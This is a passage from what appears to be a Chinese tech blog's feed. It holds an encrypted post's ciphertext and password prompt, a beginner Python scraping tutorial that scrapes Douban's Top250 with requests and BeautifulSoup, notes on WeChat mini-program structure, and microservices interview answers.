fb5ce351689b415a0d64f387d2f39ba37868efe894056035110302af4ed795ee80b6fc1db5caafbb9f11cd67ab218d0ef9a1458ca6d1f0d7cb5ed2c3d3aeba5d6cea373ed60840937bbca6575590a7d6a7cf9085237b460fd78559e4db34c40c8e88d9e92f9aa3d8c056d03994b4c109a54410050e56a8075d1ddc9532daf3322e3638feb64224d32eb5d6609e355d8805ce3f0d40171b24911252d8e556b443cce505d3e90fb3e858cfa9d9ba90b4ec5b781b7c79688826e2b5c73949a1ab36fed9642a6b8762310642b351a917413da45d74519724516c19f5b775d34f215af00322fee49db124f3c13df8830caf7c403a34eac405e9c8404c8baf6ac69129df79c34fa1c6729b1944ec201d99498cfca378aa9975301a1673f6f3416fe89accf02a5ae0cd7c0b91328c10c7570c673e4218c817a11415adc3f921c15da7958e5c7a515636549682ea4a7b5d3009b21222e31cdffaa3fc09862a6c3558739b9420eda3471d82b2a21adff41aa341f7ee266ad88f233540b3477ac6de9387ed91682fd8bd167a3b873491b61cadcac98fc301025e49d4634307003764a49b3d9ead343082c6bee498d67529dfa4fab9307c0480e970694461e56c8bb0ccc833272afe2942733df99434f6c12ee1f5bc76f5339f5f29840e639b3878710ad4fece1ba0e7a3c97ee36d2ae7c178bf5321e408d087e6d8e7b788ff8ce155ce089876b5f699136b29c9d44628cd099f306090e6df2ff731b5c8eb8a0b69337961b17aaf788a54b20873b3986572cc15e9ffc39383e2e0969b0cf6b4b86d6af5f05bc572b335a9f033a66d73615f4f79785c1ad9826b75c3bb27bbd98dc85a79e338ef6ab07aede76fc822f0c3c7ee5f235fbb78230dc6865050eb007513553d49c44f4c874685ba1f7cf21f0fbd2ef7e68e6cbddb0c66cfcc1e6d3cf5fb2cc03d0e5566a9b0b410c457d9692bd0b406a1d8554cabe87da029de089e440dad882372a3c915953e51cde5a5ad1b4a7aeff34256ae282c27bb41491bd40bfc4767a2635660d03a370c40de4cbf32e7967d83cea252a467a78a0053fe7fec3212ce5eddb2707231217000ddd5f3b4b01e6e39253e45d2373f3fa09039cd82e53abe7cfcfdbdba7fcdd62d81d52258d9fb09e4fd0844afd83f2de10eb250c47173afc8c81a941a197b7e5350ed6001854b8162902f66786a4178704a5d33aa3fd18370e8dfaee38cd2ffbadb54e65a65544f2bfc6f6abeb3e583e056d1512b4f923a8c8237b2fc6772d821ce3d69fc1345cc5f338dfdd76b425703fab14c15eeee1f79be93a306774c0ff9276717d968e8d793e552f0c031ceefd997fb9294692c2779a38108befe771d11947369776fce0fa0c695ea5d2d2e6578b16cd9777837d4bfeeee55ad95561cd5d9f1b60a07f4fe010eeacd7887586fdfa1e29815e2f04883230bb11ae26afe33c94ffb2668dd8117d47ae9b797a15ad2e9bc8a1cc284b2b3edf35493223bba1fc8a270f9b66f87d354e411c34605cd7e1a668c2e6ae4b4fa6c98f7b9713804ca247a8820b3166e9ab6c781d84829bdd8f3a607d0f8615d6e46554e381770772b5b02008e6d69785ed5787f1d0d8306aabd50f30191f7a3bb51855be3405f6b149f45e763fe3c763714d4480ee3031bdf7f986501e0d527c326618589dd84c8b442c90d227065180eaae34c219af2609cbaf2cfa0eb016a089c1dd06aea6530515c62c13a2144abe1c7f279f533fdfabf0091223ef9bd11a982dfbee9ada1b9a69faca3dd0dc9b3b0fd7e406c39a7d914361fbf3e874e111658c57ccd421944c68718c80baead4a041f6f67ba19a910464199dd80b2e335a49a48b4e0ea626b154ccc6174e463304e294ee96e4ba060f0e9ca7bf5f53faf8eca90f4e7d43043abb2932b04f6ee2b31bfdfc5b4a2470a9acf8a1d0a39e5e67604288c69a3e7a386a92a932d28f1bd438dd6df5362c8a7113c2af557412f9fc5bbc7c012ec2071af51a917b7dbf71dbef4213a92b016939b7c243da6300823f84d5ca06f64b025c985ce7e42946f32129a59436b40910d4b705bfa191783aba9e63535f71fafe38acc40ad2a27d9802c5360f765f05c25021354438b5bc010f2454ef85a7374101574de0b6fcc007161d207555ab28d260c5f498183265cd9f4ad49279f68ab4bde8cdddb61a26f6401192e18924afaecd8bb6434712fb6f89ef7b90a70b00e71b5abbca67aad02c48e3d0a3b0bd85727cd86451f76d01286a1d529627161259f5a0e30ab60cd9a6c6c77790cf3622594bfc143ce873c6457d5ce3252d7838f705c078553390107cf6714db26fc4f11070fa72914d26f8ccdc84800b3e3854ef1735d54d104727f35ea10021a4d32669868e71052b7c3663f8bb85d8cf53226240a031b42891f6920dc77e2be0da3eba2d4ef58ecfa5156603ca95c242df271f7a502c404cdf7397f3d0e2f8b824de28bda9229a54efaeb586a6c245e644e0cccf5d90eb76385ebcb444819b4357d94095465edc8b7e835b85ad6bf4893f5950525e91d611ae0ad43e932b465bc898fdebda4a8f2411fd80a32e53a766a1a2e949f8cfafc43769aee79bd6740fa8e1d2eb2b28458afd6b70825fe785505a2949910ee7d78e781a23ce7ad64630ac5b76933ab577132a1f5e7980ef88934742c9403f19c1f32027376371d3d69f58384e846f16d6c188b3a51b65d81affbe3d5d306fcbdfe0e2964fb3721e9c089b6e599fe716d310f19093acea216c39630f8b9c03d00e493fc817d439d509a7dbeff273c122c8a5c02074bd5950e78963f47aec8ac2b218419f09f7a49c2f663a3f9bd4b9afdb06c70b62820caa9e931d861ccaa33bb3cebf2a38a1d6f8a0126777027292e60624ff4749da45fd5a552848af979a3f28e50eb5ec1fe945444f776382815447238e826d7de9d1f58e5c5c9a00b8b9b60fa59263abaa7ce31914aab4a0750360606df413d4277fb2ba00f097b310572175e85498cf2a32ee165225bc68c729c6531c5705e3d74dbbfc58232fb8b13aa74fd492cf7334cb74da68af21a07bb71e6b239204becc8ba8cd5ee3f665dd1aca1525374b954784b802c26b7cf7e26796f27a20f296555010e81d8079e0d29834ec0b4468adee2edfec84ad7c603360c8a8b940d2bee105faabf7ead395fe707608a601c2a1b23e2140bc56e83162ce2628bcf9730c8b8bcfbb25b8fb9eb29bbe178ced26447fdefbd87cbe91938f6731c3e46a37059f3a1fb49cf49180efcb366e747c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">文章转载</summary>
    
    
    
    <category term="杂类" scheme="https://www.fomal.cc/categories/%E6%9D%82%E7%B1%BB/"/>
    
    
    <category term="转载文章" scheme="https://www.fomal.cc/tags/%E8%BD%AC%E8%BD%BD%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title>简单的python爬虫</title>
    <link href="https://www.fomal.cc/posts/2e8932a3.html"/>
    <id>https://www.fomal.cc/posts/2e8932a3.html</id>
    <published>2023-08-13T12:26:46.125Z</published>
    <updated>2023-06-24T11:21:46.761Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、requests-get"><a href="#一、requests-get" class="headerlink" title="一、requests.get()"></a>一、requests.get()</h3><h5 id="①安装requests库"><a href="#①安装requests库" class="headerlink" title="①安装requests库"></a>①安装requests库</h5><p>​       windows电脑命令提示符为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure><h5 id="②requests库的作用"><a href="#②requests库的作用" class="headerlink" title="②requests库的作用"></a>②requests库的作用</h5><p>​       requests库可以帮助我们下载网页源代码、文本、图片，甚至是音视频。本质是向服务器发送请求并得到相应</p><h5 id="③requests库使用"><a href="#③requests库使用" class="headerlink" title="③requests库使用"></a>③requests库使用</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#在使用前需要先通过 import 来引入 requests 库</span></span><br><span class="line">res = requests.get(<span class="string">&#x27;URL&#x27;</span>)</span><br><span class="line"><span class="comment">#我们通过调用requests库中的get()方法来获取数据，这个方法需要一个参数，这个参数就是你需要请求的网址。当请求得到「响应」时，服务器返回的数据就被赋值到 res 这个变量上面</span></span><br></pre></td></tr></table></figure><p>​        requests.get 是在调⽤requests库中的get()⽅法，它向服务器发送了⼀个请求，括号⾥的参数是你需要的数据所在的⽹址，然后服务器对请求作出了响应。我们把这个响应返回的结果赋值在变量res上。</p><h3 id="二、Response对象常用属性"><a href="#二、Response对象常用属性" class="headerlink" title="二、Response对象常用属性"></a>二、Response对象常用属性</h3><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">response.status_code</td><td style="text-align:center">检查请求是否成功</td></tr><tr><td style="text-align:center">response.content</td><td style="text-align:center">response对象的二进制数据</td></tr><tr><td style="text-align:center">response.text</td><td style="text-align:center">sesponse对象的字符串数据</td></tr><tr><td style="text-align:center">response.encoding</td><td style="text-align:center">response对象的编码</td></tr></tbody></table></div><p>下位状态响应码以及解释</p><div class="table-container"><table><thead><tr><th style="text-align:center">响应状态码</th><th style="text-align:center">说明</th><th style="text-align:center">例子</th><th style="text-align:center">例子说明</th></tr></thead><tbody><tr><td style="text-align:center">1xx</td><td style="text-align:center">请求接收</td><td style="text-align:center">100</td><td style="text-align:center">继续提供请求</td></tr><tr><td style="text-align:center">2xx</td><td style="text-align:center">请求成功</td><td style="text-align:center">200</td><td style="text-align:center">请求成功</td></tr><tr><td style="text-align:center">3xx</td><td style="text-align:center">重定向</td><td style="text-align:center">305</td><td style="text-align:center">应使用代理访问</td></tr><tr><td style="text-align:center">4xx</td><td style="text-align:center">客户端错误</td><td style="text-align:center">403</td><td style="text-align:center">禁止访问</td></tr><tr><td style="text-align:center">5xx</td><td style="text-align:center">服务器错误</td><td style="text-align:center">503</td><td style="text-align:center">服务不可用</td></tr></tbody></table></div><ol><li><p><strong>response.content</strong></p><p>把Response对象内容以二进制数据的形式返回，适用于图片、音频、视频下载</p></li><li><p><strong>response.text</strong></p><p>将response.content的二进制数据转换为字符串，适用于文字或者是网页源代码的下载</p></li><li><p><strong>response.encoding</strong></p><p>能帮助我们定义Response对象的编码</p></li></ol><h3 id="三、爬虫规范"><a href="#三、爬虫规范" class="headerlink" title="三、爬虫规范"></a>三、爬虫规范</h3><h5 id="Robots-协议"><a href="#Robots-协议" class="headerlink" title="Robots 协议"></a>Robots 协议</h5><p>​      Robots 协议是互联⽹爬⾍的⼀项公认的道德规范，它的全称是“⽹络爬⾍排除标准”（Robots exclusion protocol），这个协议⽤来告诉爬⾍，哪些⻚⾯是可以抓取的，哪些不可以。</p><h5 id="协议查看"><a href="#协议查看" class="headerlink" title="协议查看"></a>协议查看</h5><ol><li>在网站的域名后面加上robot.txt就可以了。比如淘宝的Robot协议（<a href="https://www.taobao.com/robots.txt）">https://www.taobao.com/robots.txt）</a></li><li>协议里面最常见的英文是Allow和Disallow，Allow代表可以被访问，Disallow则代表禁止被访问</li></ol><h3 id="四、爬虫实践"><a href="#四、爬虫实践" class="headerlink" title="四、爬虫实践"></a>四、爬虫实践</h3><p>我们下面将进行一个简单的爬虫的编写，首先我们确定目标</p><ol><li>目标网站：<a href="https://movie.douban.com/chart">https://movie.douban.com/chart</a></li><li>网站协议：<a href="https://movie.douban.com/robots.txt（⽬标⽹站">https://movie.douban.com/robots.txt（⽬标⽹站</a> + robots.txt 可查看⽬标⽹站的⻚⾯爬取许可）</li><li>爬取目标：爬取电影名、URL、电影基本信息和电影评分信息。</li></ol><h5 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h5><ol><li><p>确定数据位置、</p><ul><li>电影名、电影基本信息和电影评分信息详情⻚、URL均在 html ⻚⾯上；</li><li>获取数据⽤ requests.get() ；</li><li>解析数据⽤ BeautifulSoup</li></ul></li><li><p>提取数据（以当前网站为例）</p><ul><li>在⽹⻚的空⽩处点击右键，然后选择“检查”（快捷⽅式是ctrl+shift+i），再在 Elements ⻚⾯按 ctrl+f；</li><li>点击【检查】⻚⾯左上⻆的 “⿏标” 按钮，再点击后右侧想要获取的内容可以定位到该内容对应的标签；</li><li>如此，我们就定位到了电影名的所在位置，a标签内的文本，甚至还顺带找到了详情页URL的所在位置。如上图，a标签里有属性href，其值是<a href="https://movie.douban.com/subject/27010768/。点击它，你会跳转到这部电影的详情页：">https://movie.douban.com/subject/27010768/。点击它，你会跳转到这部电影的详情页：</a></li><li>所以到时候，我们可以去提取a标签。接着，先用text拿到它的文本，再使用[href]获取到URL。</li><li>以此网站为例，当我们的光标放在P标签上时，这个P标签包含了某部电影的所有基本信息</li><li>这些都是p标签里的纯文本。这个p标签的属性是class=”pl”</li><li>根据电影名、URL、电影基本信息和电影评分信息的路径，我们可以知道这四者的最小共同父级标签是：div class=”pl2”。</li></ul><h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><p>爬取豆瓣top250电影评分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://movie.douban.com/top250&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&#x27;</span>&#125;</span><br><span class="line">response = requests.get(url, headers=headers)</span><br><span class="line">soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line">movies = soup.find(class_=<span class="string">&#x27;grid_view&#x27;</span>).find_all(<span class="string">&#x27;li&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> movie <span class="keyword">in</span> movies:</span><br><span class="line">    title = movie.find(class_=<span class="string">&#x27;title&#x27;</span>).string</span><br><span class="line">    rating = movie.find(class_=<span class="string">&#x27;rating_num&#x27;</span>).string</span><br><span class="line">    <span class="built_in">print</span>(title, rating)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>这个程序会向豆瓣电影 Top250 的网页发送请求，然后使用 BeautifulSoup 库解析网页内容，获取电影名称和评分信息，并打印输出。</p>]]></content>
    
    
    <summary type="html">基础爬虫知识</summary>
    
    
    
    <category term="python" scheme="https://www.fomal.cc/categories/python/"/>
    
    
    <category term="爬虫" scheme="https://www.fomal.cc/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>微信小程序笔记（一）</title>
    <link href="https://www.fomal.cc/posts/a920c857.html"/>
    <id>https://www.fomal.cc/posts/a920c857.html</id>
    <published>2023-08-13T12:26:46.122Z</published>
    <updated>2023-06-17T10:43:55.849Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、项目结构"><a href="#一、项目结构" class="headerlink" title="一、项目结构"></a>一、项目结构</h3><ol><li><strong>pages</strong>：用来存放所有小程序页面</li><li><strong>utils</strong>：用来存放工具性质的模块（例如：格式化时间的自定义模块）</li><li><strong>app.js</strong>：小程序项目的入口文件</li><li><strong>app.json</strong>：小程序项目的全局配置文件</li><li><strong>app.wxss</strong>：小程序项目的全局样式文件</li><li><strong>project.config.json</strong>：项目的配置文件</li><li><strong>sitemap.json</strong>：用来配置小程序及其页面是否允许被微信索引</li></ol><h3 id="二、小程序的页面组成部分"><a href="#二、小程序的页面组成部分" class="headerlink" title="二、小程序的页面组成部分"></a>二、小程序的页面组成部分</h3><p>官方建议把所有小程序页面，都放在pages目录中，以单独文件夹存在，每个页面由4个基本文件组成：</p><ol><li><strong>.js</strong>文件（页面的脚本文件，存放页面的数据、事件处理函数等）</li><li><strong>.json</strong>文件（当前页面的配置文件，配置窗口的外观、表现等）</li><li><strong>.wxml</strong>文件（页面的模板结构文件）</li><li><strong>.wxss</strong>文件（当前页面的样式表文件）</li></ol><h3 id="三、小程序代码的构成-JSON配置文件"><a href="#三、小程序代码的构成-JSON配置文件" class="headerlink" title="三、小程序代码的构成 - JSON配置文件"></a>三、小程序代码的构成 - JSON配置文件</h3><p>JSON配置文件的作用：通过不同的<strong>.json</strong>配置文件，可以对小程序项目进行不同级别的配置</p><p>小程序中有4种JSON配置文件，分别为：</p><ol><li>项目根目录中的 <strong>app.json</strong> 配置文件：当前小程序的全局配置，包括了小程序的所有页面路径、窗口外观、界面表现、底部tab等,有以下几个主要配置项：<ol><li>pages: 用来记录当前小程序所有页面的路径</li><li>window：全局定义小程序所有页面的背景色、文字颜色等</li><li>style：全结定义小程序组件所使用的样式版本（默认v2）</li><li>sitemapLocation：用来指明 sitemap.json 的位置</li></ol></li><li>项目根目录中的 <strong>project.config.json</strong> 配置文件：项目配置文件，用来记录我们对小程序开发工具所做的个性化配置，例如：<ol><li>setting 中保存了编译相关的配置</li><li>projectname 中保存项目名称（可随意填写，不等于小程序名字）</li><li>appID 中保存小程序账号的ID（如果是在自己账号上运行别人的项目，记得把APPID改成自己的，否则容易报错）</li></ol></li><li>项目根目录中的 <strong>sitemap.json</strong> 配置文件：配置小程序页面是否允许微信索引。如果允许微信索引，微信会通过爬虫为小程序页面内容建立索引。当用户搜索关键词和页面的索引匹配成功时，小程序的页面将可能展示在搜索结果中。（<em>注：sitemap 的索引提示是默认开启的，如果需要关闭索引提示，可在peoject.config.json 的 setting 中配置字段 <strong>checkSiteMap</strong> 为 false</em>）</li><li>每个页面文件夹中的 <strong>.json</strong> 文件：</li></ol>]]></content>
    
    
    <summary type="html">微信小程序结构</summary>
    
    
    
    <category term="微信小程序" scheme="https://www.fomal.cc/categories/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
    
    <category term="微信小程序笔记" scheme="https://www.fomal.cc/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>微服务面试题</title>
    <link href="https://www.fomal.cc/posts/d2849c17.html"/>
    <id>https://www.fomal.cc/posts/d2849c17.html</id>
    <published>2023-08-13T12:26:46.113Z</published>
    <updated>2023-06-17T10:43:55.849Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-什么是微服务？"><a href="#1-什么是微服务？" class="headerlink" title="1. 什么是微服务？"></a>1. 什么是微服务？</h3><p>微服务是一种架构风格，其中软件系统由一组小型服务构成，这些服务可以独立地部署、扩展和替换。每个服务都应该围绕着一个特定的业务能力进行构建，而且要能够独立地运行在自己的进程中。</p><h3 id="2-微服务的优点是什么？"><a href="#2-微服务的优点是什么？" class="headerlink" title="2.微服务的优点是什么？"></a>2.微服务的优点是什么？</h3><p>优点：</p><ul><li>更高的灵活性和可伸缩性。</li><li>更好的可维护性和可测试性。</li><li>更好的可扩展性和可部署性。</li><li>更好的分离关注点，每个服务都专注于自己的业务功能。</li></ul><p>缺点：</p><ul><li>更高的复杂性，需要额外的工具和基础设施来管理。</li><li>更高的开发和部署成本，需要对每个服务进行独立的开发、测试和部署。</li><li>更高的运维成本，需要对每个服务进行独立的监控、日志和故障排除。</li><li>更多的网络延迟和开销，由于服务之间的通信需要通过网络进行。</li></ul><h3 id="3-微服务常用组件"><a href="#3-微服务常用组件" class="headerlink" title="3.微服务常用组件"></a>3.微服务常用组件</h3><p>微服务架构通常会使用以下组件：</p><ol><li>服务注册与发现组件：例如Consul、ZooKeeper、Eureka等。它们用于将微服务实例注册到注册中心，并使客户端能够发现可用的服务实例。</li><li>API网关组件：例如Zuul、Kong、API Gateway for AWS等。它们用于将外部请求路由到相应的微服务，并提供负载均衡、安全性、缓存、限流等功能。</li><li>分布式配置中心组件：例如Spring Cloud Config、etcd等。它们用于将配置信息集中管理，并将其分发到不同的微服务实例中。</li><li>消息中间件组件：例如Kafka、RabbitMQ、ActiveMQ等。它们用于实现微服务之间的异步通信、事件驱动等。</li><li>监控与日志组件：例如ELK、Zipkin、Prometheus、Grafana等。它们用于收集、分析和展示微服务的运行时指标、日志信息等。</li><li>容器化平台组件：例如Docker、Kubernetes等。它们用于将微服务部署到容器中，并提供自动化部署、弹性伸缩、负载均衡等功能。</li><li>数据库和缓存组件：例如MySQL、Redis、MongoDB等。它们用于存储和管理微服务所需的数据和缓存信息</li></ol><h3 id="4-微服务架构和单体架构的区别是什么？"><a href="#4-微服务架构和单体架构的区别是什么？" class="headerlink" title="4.微服务架构和单体架构的区别是什么？"></a>4.微服务架构和单体架构的区别是什么？</h3><p>单体应用架构将整个应用程序构建为一个单一的、紧密耦合的系统，而微服务架构则将应用程序划分为一组较小的、独立的、松耦合的服务。单体应用程序通常更容易构建和部署，但是随着应用程序规模的增加，其复杂性也会增加。微服务架构则更加灵活和可伸缩，并且可以更好地支持大规模的分布式系统</p><h3 id="5-微服务架构中的服务发现和负载均衡有什么作用？"><a href="#5-微服务架构中的服务发现和负载均衡有什么作用？" class="headerlink" title="5.微服务架构中的服务发现和负载均衡有什么作用？"></a>5.微服务架构中的服务发现和负载均衡有什么作用？</h3><p>微服务架构中的服务发现和负载均衡有以下作用：</p><ol><li>服务发现：在微服务架构中，每个服务都是一个独立的部署单元，可能会动态地加入或退出系统，因此需要一个机制来自动发现服务的位置和状态。服务发现机制使得服务之间可以直接通信，不需要手动配置IP地址或端口号，同时也支持负载均衡和故障转移。</li><li>负载均衡：在微服务架构中，一个服务通常会有多个实例运行在不同的节点上，需要一个负载均衡器将请求分配到这些实例中，以达到负载均衡的效果。负载均衡器可以根据不同的策略来选择实例，如轮询、权重等。</li></ol><p>服务发现和负载均衡通常是通过一个服务注册中心来实现的，注册中心负责维护服务的信息和状态，同时提供API供服务之间进行注册、发现和心跳检测等操作。常见的服务注册中心有Consul、ZooKeeper和Etcd等。</p><h3 id="6-什么是服务注册与发现？"><a href="#6-什么是服务注册与发现？" class="headerlink" title="6.什么是服务注册与发现？"></a>6.什么是服务注册与发现？</h3><p>服务注册与发现是微服务架构中的一个核心概念，它允许服务在运行时注册自己的网络地址，并通过服务注册表使其可用于其他服务。服务注册表是一个包含所有可用服务及其地址的中央存储库，服务可以查询此存储库以查找需要的其他服务。</p><h3 id="7-如何处理微服务中的异步调用？"><a href="#7-如何处理微服务中的异步调用？" class="headerlink" title="7.如何处理微服务中的异步调用？"></a>7.如何处理微服务中的异步调用？</h3><p>在微服务架构中，异步调用是一个常见的技术，可以提高系统的可扩展性和性能。下面是处理微服务中异步调用的几种常见方式：</p><ol><li>消息队列：使用消息队列可以实现异步调用，例如将需要执行的任务放入消息队列中，然后由消息队列中的消费者异步处理。</li><li>异步REST：使用异步REST的方式，客户端通过发起异步HTTP请求来调用服务端的API。服务端接收请求后，返回HTTP响应，并不等待客户端处理响应。</li><li>Reactive编程：使用Reactive编程模型，可以在异步调用中处理大量并发请求，以提高系统的性能和吞吐量。</li><li>Future/Promise：使用Java中的Future/Promise来处理异步调用。当客户端调用服务端API时，服务端可以立即返回一个Future对象，客户端可以在需要时获取Future的结果。</li><li>Callback回调：使用Callback回调机制，当服务端处理完请求后，可以通过回调机制来通知客户端，从而实现异步调用。</li></ol><p>以上这些方式都可以用来处理微服务中的异步调用，具体应该根据实际情况选择合适的方式。</p><h3 id="8-微服务如何保证数据的一致性？"><a href="#8-微服务如何保证数据的一致性？" class="headerlink" title="8.微服务如何保证数据的一致性？"></a>8.微服务如何保证数据的一致性？</h3><p>微服务架构下，由于每个服务都有自己的数据库，因此保证数据的一致性变得更加困难。以下是一些常见的方法来解决微服务中的数据一致性问题：</p><ol><li>两阶段提交协议：在分布式系统中，最为经典的解决数据一致性问题的方法就是两阶段提交协议。该协议分为两个阶段，第一个阶段是准备阶段，在该阶段中，协调者向所有参与者发出准备请求，参与者执行本地事务，并反馈事务执行结果给协调者。如果所有参与者都执行成功，那么协调者就会向所有参与者发出提交请求，所有参与者在收到提交请求后执行提交操作，如果有任何一个参与者在准备阶段或提交阶段失败，那么整个操作将被回滚，保证数据一致性。</li><li>三阶段提交协议：该协议是在两阶段提交协议的基础上演化而来，它在两阶段提交协议的基础上增加了一个超时机制，从而解决了两阶段提交协议中的阻塞问题。</li><li>消息队列：在微服务架构中，可以通过消息队列来解决数据一致性问题。当需要多个服务协作完成一项操作时，将操作请求发送到消息队列中，每个服务从队列中获取请求并执行相应的操作，完成后再将结果发送到消息队列中，其他服务再从队列中获取结果进行后续处理。</li><li>分布式事务：使用分布式事务来处理数据一致性问题是一种比较彻底的解决方案，但实现起来比较复杂。在分布式事务中，所有涉及到的服务都参与到同一个全局事务中，由一个事务协调者来管理整个事务的执行过程，保证所有操作的一致性。</li></ol><h3 id="9-什么是api网关？有什么作用？"><a href="#9-什么是api网关？有什么作用？" class="headerlink" title="9.什么是api网关？有什么作用？"></a>9.什么是api网关？有什么作用？</h3><p>API网关是一个微服务架构中的组件，用于统一对外暴露的API接口，并提供一些常见的API网关功能，例如路由、负载均衡、缓存、鉴权和监控等。API网关通常是一个单独的、可扩展的组件，可以轻松地集成到现有的微服务架构中</p><h3 id="10-微服务中怎么保证分布式事务的一致性？"><a href="#10-微服务中怎么保证分布式事务的一致性？" class="headerlink" title="10.微服务中怎么保证分布式事务的一致性？"></a>10.微服务中怎么保证分布式事务的一致性？</h3><p>在微服务架构中，由于每个服务都是独立的进程，因此可能会出现分布式事务一致性的问题。为了保证分布式事务的一致性，可以采用以下方法：</p><ol><li>两阶段提交（2PC）：在2PC中，事务的提交被分为两个阶段：投票和提交。在投票阶段，所有涉及到的事务参与者将通知协调者是否可以提交。如果所有参与者都同意提交，则进入提交阶段，所有参与者将提交事务，并等待协调者发送提交完成消息。如果有任何一个参与者拒绝提交，则事务将被回滚。</li><li>补偿事务（Compensating Transaction）：在补偿事务中，当分布式事务中的一个或多个服务发生错误时，可以回滚已经执行的操作，同时执行与之相反的操作以保证数据一致性。例如，如果在购买商品的过程中发生错误，可以执行取消订单的操作以回滚已经扣除的金额。</li><li>基于消息的事务（Message-based Transaction）：在基于消息的事务中，将事务提交操作和后续处理操作分离开来，通过消息队列来实现两者的解耦。当事务提交时，将消息发送到消息队列中，其他服务订阅该消息并执行后续处理操作。如果后续处理操作失败，则可以回滚之前的事务提交操作。</li><li>Saga模式：Saga模式是一种用于解决分布式事务问题的设计模式。在Saga模式中，事务被拆分成多个子事务，每个子事务都有自己的回滚操作。当一个子事务失败时，将会执行回滚操作，以保证数据一致性。Saga模式需要对业务流程进行拆分和设计，并且需要在每个服务中实现Saga协议</li></ol><h3 id="微服务架构中服务之间的通信方式有哪些？它们的优缺点是什么？如何选择适合自己业务的通信方式？"><a href="#微服务架构中服务之间的通信方式有哪些？它们的优缺点是什么？如何选择适合自己业务的通信方式？" class="headerlink" title="微服务架构中服务之间的通信方式有哪些？它们的优缺点是什么？如何选择适合自己业务的通信方式？"></a>微服务架构中服务之间的通信方式有哪些？它们的优缺点是什么？如何选择适合自己业务的通信方式？</h3><p>微服务架构中服务之间的通信方式主要包括以下几种：</p><ol><li>HTTP/REST：使用 HTTP 协议进行通信，以 RESTful 风格设计 API。优点是简单易用，易于理解和调试，支持各种编程语言，适合互联网应用等场景。缺点是性能相对较低，不适合大规模高并发的场景。</li><li>RPC：远程过程调用，通过定义接口和协议进行通信。优点是性能较高，支持异步和多种协议，适合复杂业务场景。缺点是实现和维护成本较高，不利于跨语言和跨平台调用。</li><li>消息队列：通过消息中间件进行通信，发送和接收消息。优点是支持异步和削峰填谷，可靠性高，支持广播和多消费者模式，适合分布式和异构系统。缺点是实现和维护成本较高，不支持实时性要求高的场景。</li><li>gRPC：Google 开源的基于 HTTP/2 和 Protobuf 的高性能 RPC 框架。优点是性能和功能优秀，支持多语言和多平台，适合复杂业务场景。缺点是使用复杂度较高，需要熟练掌握 Protobuf 和 HTTP/2。</li></ol><p>选择适合自己业务的通信方式需要考虑多个方面，如性能要求、并发量、数据一致性、服务可靠性、开发成本、跨平台和跨语言等因素。需要根据实际情况进行综合评估和选择。</p><h3 id="如何保证微服务架构下的服务高可用？有哪些常用的方法？"><a href="#如何保证微服务架构下的服务高可用？有哪些常用的方法？" class="headerlink" title="如何保证微服务架构下的服务高可用？有哪些常用的方法？"></a>如何保证微服务架构下的服务高可用？有哪些常用的方法？</h3><p>微服务架构下的服务高可用是保障整个系统稳定性和可靠性的关键因素之一。为了保证微服务架构下的服务高可用，可以采用以下常用方法：</p><ol><li>负载均衡：通过负载均衡技术将请求分发到多个服务实例中，实现服务的水平扩展，提高系统吞吐量和可用性。</li><li>集群：将多个服务实例部署到不同的节点上，通过集群技术实现服务的纵向扩展，提高系统的容错性和可用性。</li><li>服务治理：通过服务注册和发现、服务监控、服务熔断等手段实现服务的高可用和自动化管理。</li><li>异地多活：将服务实例部署到不同的地理位置上，通过异地多活技术实现灾备容灾和故障恢复，提高系统的可用性和稳定性。</li><li>自动化运维：通过自动化部署、自动化测试、自动化监控等手段实现服务的快速上线、自动化管理和快速响应故障，提高系统的可用性和稳定性。</li></ol><p>需要根据具体的业务场景和系统要求，结合实际情况进行综合考虑和选择。同时，也需要注重服务的监控和容错机制，及时发现和处理故障，保障服务的高可用性和可靠性。</p><h3 